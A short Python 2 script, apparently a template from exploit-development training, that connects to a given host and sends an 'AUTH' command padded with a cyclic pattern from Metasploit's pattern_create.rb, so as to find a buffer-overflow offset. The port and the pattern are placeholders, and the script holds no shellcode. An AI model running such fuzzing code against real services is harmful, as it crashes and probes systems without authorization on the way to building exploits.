#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = ###
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()
# Create a randomized buffer generated by pattern_create.rb
req1 = "AUTH " + "random output from pattern_create.rb here"
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
